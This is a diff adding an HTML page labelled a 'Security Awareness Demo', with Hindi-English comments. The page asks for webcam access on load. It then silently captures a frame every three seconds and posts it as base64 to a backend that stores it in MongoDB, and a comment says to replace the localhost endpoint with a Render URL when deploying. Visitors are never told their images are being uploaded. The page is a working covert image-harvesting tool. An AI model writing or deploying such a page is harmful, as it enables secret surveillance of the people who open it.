@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Camera Capture Demo</title>
+</head>
+<body>
+
+    <h2>Security Awareness Demo</h2>
+    <!-- Video element jo camera feed dikhayega -->
+    <video id="webcam" autoplay playsinline width="320" height="240"></video>
+    
+    <!-- Hidden canvas jisse video ko image mein badla jata hai -->
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        async function startCamera() {
+            try {
+                // Browser user se camera ki permission maangega
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                
+                // Permission milne ke baad har 3 seconds mein frame bhejega
+                setInterval(captureAndSendFrame, 3000);
+            } catch (err) {
+                console.error("Camera permission denied: ", err);
+            }
+        }
+
+        function captureAndSendFrame() {
+            // Video frame ko canvas par draw karna
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Frame ko Base64 format mein convert karna
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // Backend server par POST request bhejna
+            // (Jab Render par deploy karein, toh yahan apna Render URL daalein)
+            fetch('http://localhost:5000/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Saved to MongoDB:", data))
+            .catch(error => console.error("Error:", error));
+        }
+
+        // Page load hote hi camera start karne ki koshish
+        window.onload = startCamera;
+    </script>
+
+</body>
+</html>
